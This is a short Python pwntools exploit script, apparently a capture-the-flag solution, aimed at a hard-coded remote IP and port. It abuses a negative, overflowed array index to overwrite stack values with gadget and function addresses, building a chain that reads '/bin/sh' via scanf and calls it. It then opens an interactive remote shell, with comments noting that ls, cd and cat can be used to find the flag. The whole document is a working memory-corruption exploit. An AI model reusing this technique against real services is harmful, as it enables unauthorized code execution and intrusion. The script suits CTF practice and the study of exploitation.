from pwn import *

context.log_level = 'debug'

r = remote('4.31.182.242', 9003)

r.recvuntil('you? \n')
r.sendline('see') # name


r.recvuntil('index\n')
r.sendline(str(-2147483648 + 13))
r.recvuntil('value\n')
r.sendline(str(int('08048460',16)))


r.recvuntil('index\n')
r.sendline(str(-2147483648 + 14))
r.recvuntil('value\n')
r.sendline(str(int('080487ba',16)))


r.recvuntil('index\n')
r.sendline(str(-2147483648 + 15))
r.recvuntil('value\n')
r.sendline(str(int('0804882f',16)))

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 16))
r.recvuntil('value\n')
r.sendline(str(int('08049b24',16)))

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 17))
r.recvuntil('value\n')
r.sendline(str(int('08048430',16)))

r.recvuntil('index\n')
r.sendline(str(-2147483648 + 19))
r.recvuntil('value\n')
r.sendline(str(int('08049b24',16)))

r.recvuntil('index\n')
r.sendline('-1')
r.recvuntil('value\n')
r.sendline('10') # since we are done, we can make counter 10

r.recvuntil('0 0 0 0 0 0 0 0 0 0 ')
r.sendline('/bin/sh') # this is due to scanf that we put to stack

r.interactive() # we can use ls,cd,cat to find flag.
